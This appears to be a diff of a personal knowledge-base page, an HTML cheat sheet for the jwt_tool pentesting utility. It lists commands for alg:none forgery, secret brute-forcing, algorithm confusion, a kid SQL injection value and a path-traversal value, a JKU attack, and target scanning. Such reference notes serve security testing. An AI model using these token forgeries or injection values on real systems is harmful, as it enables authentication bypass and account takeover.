@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:58 -->
+<!-- 2026-07-30 Thu 22:16 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>jwt_tool</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,21 +886,21 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org843e0e8">Installation</a></li>
-<li><a href="#orgf6bf38b">Core Flags</a></li>
-<li><a href="#org2708a94">Common Workflows</a>
+<li><a href="#org22ad1d5">Installation</a></li>
+<li><a href="#orge423d92">Core Flags</a></li>
+<li><a href="#orgc12b112">Common Workflows</a>
 <ul>
-<li><a href="#org452e470">Decode and Inspect</a></li>
-<li><a href="#org1dec60d">Tamper Payload Interactively</a></li>
-<li><a href="#orgbc5de5a">Algorithm None Attack</a></li>
-<li><a href="#org3aca763">Brute Force Secret (HS256)</a></li>
-<li><a href="#orgac58f34">Algorithm Confusion (RS256 → HS256)</a></li>
-<li><a href="#orgca2b1dd">kid SQL Injection</a></li>
-<li><a href="#orga11cea6">Self-Signed JKU Attack</a></li>
-<li><a href="#org92d201a">Automated Scan Against Target</a></li>
+<li><a href="#orgc3f966a">Decode and Inspect</a></li>
+<li><a href="#org1df1816">Tamper Payload Interactively</a></li>
+<li><a href="#org7e42871">Algorithm None Attack</a></li>
+<li><a href="#org4e10cae">Brute Force Secret (HS256)</a></li>
+<li><a href="#org6e6f250">Algorithm Confusion (RS256 → HS256)</a></li>
+<li><a href="#org02b40b9">kid SQL Injection</a></li>
+<li><a href="#org17acdea">Self-Signed JKU Attack</a></li>
+<li><a href="#orge659776">Automated Scan Against Target</a></li>
 </ul>
 </li>
-<li><a href="#orgb963112">Tips</a></li>
+<li><a href="#orgeaf7ab4">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -898,15 +916,15 @@ Related: <a href="20260408T060128==jwt--json-web-tokens__concept_cybersecurity.h
          <a href="20260613T215303--insecure-authentication-mechanism__cybersecurity_pentesting_technique.html">Insecure Authentication Mechanism</a>
          <a href="20260314T005729--hashcat__cybersecurity_tool.html">Hashcat</a>
 </p>
-<div id="outline-container-org843e0e8" class="outline-2">
-<h2 id="org843e0e8">Installation</h2>
-<div class="outline-text-2" id="text-org843e0e8">
+<div id="outline-container-org22ad1d5" class="outline-2">
+<h2 id="org22ad1d5">Installation</h2>
+<div class="outline-text-2" id="text-org22ad1d5">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d4ef691bb9b2425faf558e48b0de4a28>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a9ae64a952e84ac2b097ef24b8c87463>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_d4ef691bb9b2425faf558e48b0de4a28=document.querySelector('button[name=btn_d4ef691bb9b2425faf558e48b0de4a28]');
-copyBtnbtn_d4ef691bb9b2425faf558e48b0de4a28.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`git clone https://github.com/ticarpi/jwt_tool\ncd jwt_tool\npip3 install termcolor cprint pycryptodomex requests --break-system-packages\n`);copyBtnbtn_d4ef691bb9b2425faf558e48b0de4a28.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d4ef691bb9b2425faf558e48b0de4a28.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_a9ae64a952e84ac2b097ef24b8c87463=document.querySelector('button[name=btn_a9ae64a952e84ac2b097ef24b8c87463]');
+copyBtnbtn_a9ae64a952e84ac2b097ef24b8c87463.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`git clone https://github.com/ticarpi/jwt_tool\ncd jwt_tool\npip3 install termcolor cprint pycryptodomex requests --break-system-packages\n`);copyBtnbtn_a9ae64a952e84ac2b097ef24b8c87463.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a9ae64a952e84ac2b097ef24b8c87463.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -917,9 +935,9 @@ pip3 install termcolor cprint pycryptodomex requests --break-system-packages
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgf6bf38b" class="outline-2">
-<h2 id="orgf6bf38b">Core Flags</h2>
-<div class="outline-text-2" id="text-orgf6bf38b">
+<div id="outline-container-orge423d92" class="outline-2">
+<h2 id="orge423d92">Core Flags</h2>
+<div class="outline-text-2" id="text-orge423d92">
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
 
 
@@ -1008,19 +1026,19 @@ pip3 install termcolor cprint pycryptodomex requests --break-system-packages
 </table>
 </div>
 </div>
-<div id="outline-container-org2708a94" class="outline-2">
-<h2 id="org2708a94">Common Workflows</h2>
-<div class="outline-text-2" id="text-org2708a94">
+<div id="outline-container-orgc12b112" class="outline-2">
+<h2 id="orgc12b112">Common Workflows</h2>
+<div class="outline-text-2" id="text-orgc12b112">
 </div>
-<div id="outline-container-org452e470" class="outline-3">
-<h3 id="org452e470">Decode and Inspect</h3>
-<div class="outline-text-3" id="text-org452e470">
+<div id="outline-container-orgc3f966a" class="outline-3">
+<h3 id="orgc3f966a">Decode and Inspect</h3>
+<div class="outline-text-3" id="text-orgc3f966a">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b6babe011ac74764ac3f78f80149c1d2>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b74f19cf740647a1b454250762450beb>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_b6babe011ac74764ac3f78f80149c1d2=document.querySelector('button[name=btn_b6babe011ac74764ac3f78f80149c1d2]');
-copyBtnbtn_b6babe011ac74764ac3f78f80149c1d2.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`python3 jwt_tool.py <token>\n`);copyBtnbtn_b6babe011ac74764ac3f78f80149c1d2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b6babe011ac74764ac3f78f80149c1d2.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_b74f19cf740647a1b454250762450beb=document.querySelector('button[name=btn_b74f19cf740647a1b454250762450beb]');
+copyBtnbtn_b74f19cf740647a1b454250762450beb.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`python3 jwt_tool.py <token>\n`);copyBtnbtn_b74f19cf740647a1b454250762450beb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b74f19cf740647a1b454250762450beb.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1029,15 +1047,15 @@ let res = copyTextToClipboard(`python3 jwt_tool.py <token>\n`);copyBtnbtn_b6babe
 </div></div>
 </div>
 </div>
-<div id="outline-container-org1dec60d" class="outline-3">
-<h3 id="org1dec60d">Tamper Payload Interactively</h3>
-<div class="outline-text-3" id="text-org1dec60d">
+<div id="outline-container-org1df1816" class="outline-3">
+<h3 id="org1df1816">Tamper Payload Interactively</h3>
+<div class="outline-text-3" id="text-org1df1816">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_36d38abc641742f8aeba8b00c7339787>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3404906627f148ea837a048dc9737118>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_36d38abc641742f8aeba8b00c7339787=document.querySelector('button[name=btn_36d38abc641742f8aeba8b00c7339787]');
-copyBtnbtn_36d38abc641742f8aeba8b00c7339787.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Opens editor to modify any claim\npython3 jwt_tool.py <token> -T\n\n# Then resign with known secret\npython3 jwt_tool.py <token> -T -S hs256 -p \"secret\"\n`);copyBtnbtn_36d38abc641742f8aeba8b00c7339787.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_36d38abc641742f8aeba8b00c7339787.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3404906627f148ea837a048dc9737118=document.querySelector('button[name=btn_3404906627f148ea837a048dc9737118]');
+copyBtnbtn_3404906627f148ea837a048dc9737118.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Opens editor to modify any claim\npython3 jwt_tool.py <token> -T\n\n# Then resign with known secret\npython3 jwt_tool.py <token> -T -S hs256 -p \"secret\"\n`);copyBtnbtn_3404906627f148ea837a048dc9737118.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3404906627f148ea837a048dc9737118.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1050,15 +1068,15 @@ let res = copyTextToClipboard(`# Opens editor to modify any claim\npython3 jwt_t
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgbc5de5a" class="outline-3">
-<h3 id="orgbc5de5a">Algorithm None Attack</h3>
-<div class="outline-text-3" id="text-orgbc5de5a">
+<div id="outline-container-org7e42871" class="outline-3">
+<h3 id="org7e42871">Algorithm None Attack</h3>
+<div class="outline-text-3" id="text-org7e42871">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_95bfcfd4257f4010ab6e7f8316d9b127>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2a456fdb95bb4f9c80d85109b6afc452>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_95bfcfd4257f4010ab6e7f8316d9b127=document.querySelector('button[name=btn_95bfcfd4257f4010ab6e7f8316d9b127]');
-copyBtnbtn_95bfcfd4257f4010ab6e7f8316d9b127.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`python3 jwt_tool.py <token> -X a\n# Outputs token with alg:none and empty signature\n# Test all variants — some apps check for \"none\", \"None\", \"NONE\"\n`);copyBtnbtn_95bfcfd4257f4010ab6e7f8316d9b127.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_95bfcfd4257f4010ab6e7f8316d9b127.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2a456fdb95bb4f9c80d85109b6afc452=document.querySelector('button[name=btn_2a456fdb95bb4f9c80d85109b6afc452]');
+copyBtnbtn_2a456fdb95bb4f9c80d85109b6afc452.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`python3 jwt_tool.py <token> -X a\n# Outputs token with alg:none and empty signature\n# Test all variants — some apps check for \"none\", \"None\", \"NONE\"\n`);copyBtnbtn_2a456fdb95bb4f9c80d85109b6afc452.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2a456fdb95bb4f9c80d85109b6afc452.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1069,15 +1087,15 @@ let res = copyTextToClipboard(`python3 jwt_tool.py <token> -X a\n# Outputs token
 </div></div>
 </div>
 </div>
-<div id="outline-container-org3aca763" class="outline-3">
-<h3 id="org3aca763">Brute Force Secret (HS256)</h3>
-<div class="outline-text-3" id="text-org3aca763">
+<div id="outline-container-org4e10cae" class="outline-3">
+<h3 id="org4e10cae">Brute Force Secret (HS256)</h3>
+<div class="outline-text-3" id="text-org4e10cae">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e4ddb097e7c04ae78e112ccddfd14a4b>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2eea69f530ca46678341640805ca78bf>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e4ddb097e7c04ae78e112ccddfd14a4b=document.querySelector('button[name=btn_e4ddb097e7c04ae78e112ccddfd14a4b]');
-copyBtnbtn_e4ddb097e7c04ae78e112ccddfd14a4b.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt\n\n# Also run with hashcat for speed (mode 16500)\nhashcat -m 16500 <token> /usr/share/wordlists/rockyou.txt\n`);copyBtnbtn_e4ddb097e7c04ae78e112ccddfd14a4b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e4ddb097e7c04ae78e112ccddfd14a4b.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2eea69f530ca46678341640805ca78bf=document.querySelector('button[name=btn_2eea69f530ca46678341640805ca78bf]');
+copyBtnbtn_2eea69f530ca46678341640805ca78bf.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt\n\n# Also run with hashcat for speed (mode 16500)\nhashcat -m 16500 <token> /usr/share/wordlists/rockyou.txt\n`);copyBtnbtn_2eea69f530ca46678341640805ca78bf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2eea69f530ca46678341640805ca78bf.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1089,15 +1107,15 @@ let res = copyTextToClipboard(`python3 jwt_tool.py <token> -C -d /usr/share/word
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgac58f34" class="outline-3">
-<h3 id="orgac58f34">Algorithm Confusion (RS256 → HS256)</h3>
-<div class="outline-text-3" id="text-orgac58f34">
+<div id="outline-container-org6e6f250" class="outline-3">
+<h3 id="org6e6f250">Algorithm Confusion (RS256 → HS256)</h3>
+<div class="outline-text-3" id="text-org6e6f250">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_54b283b1961e499e86b585852ccd047d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_c28cda0751744b3495c2796978ea8244>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_54b283b1961e499e86b585852ccd047d=document.querySelector('button[name=btn_54b283b1961e499e86b585852ccd047d]');
-copyBtnbtn_54b283b1961e499e86b585852ccd047d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Requires public key — get from /.well-known/jwks.json or TLS cert\npython3 jwt_tool.py <token> -X k -pk public.pem\n`);copyBtnbtn_54b283b1961e499e86b585852ccd047d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_54b283b1961e499e86b585852ccd047d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_c28cda0751744b3495c2796978ea8244=document.querySelector('button[name=btn_c28cda0751744b3495c2796978ea8244]');
+copyBtnbtn_c28cda0751744b3495c2796978ea8244.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Requires public key — get from /.well-known/jwks.json or TLS cert\npython3 jwt_tool.py <token> -X k -pk public.pem\n`);copyBtnbtn_c28cda0751744b3495c2796978ea8244.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c28cda0751744b3495c2796978ea8244.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1107,15 +1125,15 @@ let res = copyTextToClipboard(`# Requires public key — get from /.well-known/j
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgca2b1dd" class="outline-3">
-<h3 id="orgca2b1dd">kid SQL Injection</h3>
-<div class="outline-text-3" id="text-orgca2b1dd">
+<div id="outline-container-org02b40b9" class="outline-3">
+<h3 id="org02b40b9">kid SQL Injection</h3>
+<div class="outline-text-3" id="text-org02b40b9">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_24cece5371d242479dbea7999b16923a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_82c4eed9452a4618a03de27307eec992>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_24cece5371d242479dbea7999b16923a=document.querySelector('button[name=btn_24cece5371d242479dbea7999b16923a]');
-copyBtnbtn_24cece5371d242479dbea7999b16923a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Tamper kid to inject SQL or path traversal\npython3 jwt_tool.py <token> -T   # set kid to: ' UNION SELECT 'secret'--\n# Sign with the value the SQL returns\npython3 jwt_tool.py <token> -T -S hs256 -p \"secret\"\n\n# kid path traversal — sign with empty string (key = /dev/null)\npython3 jwt_tool.py <token> -T   # set kid to: ../../dev/null\npython3 jwt_tool.py <token> -S hs256 -p \"\"\n`);copyBtnbtn_24cece5371d242479dbea7999b16923a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_24cece5371d242479dbea7999b16923a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_82c4eed9452a4618a03de27307eec992=document.querySelector('button[name=btn_82c4eed9452a4618a03de27307eec992]');
+copyBtnbtn_82c4eed9452a4618a03de27307eec992.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Tamper kid to inject SQL or path traversal\npython3 jwt_tool.py <token> -T   # set kid to: ' UNION SELECT 'secret'--\n# Sign with the value the SQL returns\npython3 jwt_tool.py <token> -T -S hs256 -p \"secret\"\n\n# kid path traversal — sign with empty string (key = /dev/null)\npython3 jwt_tool.py <token> -T   # set kid to: ../../dev/null\npython3 jwt_tool.py <token> -S hs256 -p \"\"\n`);copyBtnbtn_82c4eed9452a4618a03de27307eec992.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_82c4eed9452a4618a03de27307eec992.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1131,15 +1149,15 @@ let res = copyTextToClipboard(`# Tamper kid to inject SQL or path traversal\npyt
 </div></div>
 </div>
 </div>
-<div id="outline-container-orga11cea6" class="outline-3">
-<h3 id="orga11cea6">Self-Signed JKU Attack</h3>
-<div class="outline-text-3" id="text-orga11cea6">
+<div id="outline-container-org17acdea" class="outline-3">
+<h3 id="org17acdea">Self-Signed JKU Attack</h3>
+<div class="outline-text-3" id="text-org17acdea">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2342b0cab6af4f598e47e07253a598be>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a182cdc96bde40239ae7b5b932505fb4>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_2342b0cab6af4f598e47e07253a598be=document.querySelector('button[name=btn_2342b0cab6af4f598e47e07253a598be]');
-copyBtnbtn_2342b0cab6af4f598e47e07253a598be.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Hosts malicious JWKS and signs with attacker key\npython3 jwt_tool.py <token> -X s\n# Follow prompts — tool generates key pair and JWKS automatically\n`);copyBtnbtn_2342b0cab6af4f598e47e07253a598be.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2342b0cab6af4f598e47e07253a598be.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_a182cdc96bde40239ae7b5b932505fb4=document.querySelector('button[name=btn_a182cdc96bde40239ae7b5b932505fb4]');
+copyBtnbtn_a182cdc96bde40239ae7b5b932505fb4.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Hosts malicious JWKS and signs with attacker key\npython3 jwt_tool.py <token> -X s\n# Follow prompts — tool generates key pair and JWKS automatically\n`);copyBtnbtn_a182cdc96bde40239ae7b5b932505fb4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a182cdc96bde40239ae7b5b932505fb4.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1150,15 +1168,15 @@ let res = copyTextToClipboard(`# Hosts malicious JWKS and signs with attacker ke
 </div></div>
 </div>
 </div>
-<div id="outline-container-org92d201a" class="outline-3">
-<h3 id="org92d201a">Automated Scan Against Target</h3>
-<div class="outline-text-3" id="text-org92d201a">
+<div id="outline-container-orge659776" class="outline-3">
+<h3 id="orge659776">Automated Scan Against Target</h3>
+<div class="outline-text-3" id="text-orge659776">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8924960d01984bd4b3588f53c9a6daa6>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7f8ad156ec3d4e3d94c9d64e3f5e14fd>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8924960d01984bd4b3588f53c9a6daa6=document.querySelector('button[name=btn_8924960d01984bd4b3588f53c9a6daa6]');
-copyBtnbtn_8924960d01984bd4b3588f53c9a6daa6.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`python3 jwt_tool.py <token> -t https://$TARGET/api/profile \\\n  -rh \"Authorization: Bearer JWT\"\n`);copyBtnbtn_8924960d01984bd4b3588f53c9a6daa6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8924960d01984bd4b3588f53c9a6daa6.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_7f8ad156ec3d4e3d94c9d64e3f5e14fd=document.querySelector('button[name=btn_7f8ad156ec3d4e3d94c9d64e3f5e14fd]');
+copyBtnbtn_7f8ad156ec3d4e3d94c9d64e3f5e14fd.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`python3 jwt_tool.py <token> -t https://$TARGET/api/profile \\\n  -rh \"Authorization: Bearer JWT\"\n`);copyBtnbtn_7f8ad156ec3d4e3d94c9d64e3f5e14fd.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7f8ad156ec3d4e3d94c9d64e3f5e14fd.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1169,9 +1187,9 @@ let res = copyTextToClipboard(`python3 jwt_tool.py <token> -t https://$TARGET/ap
 </div>
 </div>
 </div>
-<div id="outline-container-orgb963112" class="outline-2">
-<h2 id="orgb963112">Tips</h2>
-<div class="outline-text-2" id="text-orgb963112">
+<div id="outline-container-orgeaf7ab4" class="outline-2">
+<h2 id="orgeaf7ab4">Tips</h2>
+<div class="outline-text-2" id="text-orgeaf7ab4">
 <ul class="org-ul">
 <li>Always decode first to understand the structure before attacking</li>
 <li>Try <code>-X a</code> before anything else — fastest test, high yield</li>
@@ -1184,6 +1202,20 @@ test all of them, servers check case-sensitively</li>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1191,6 +1223,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
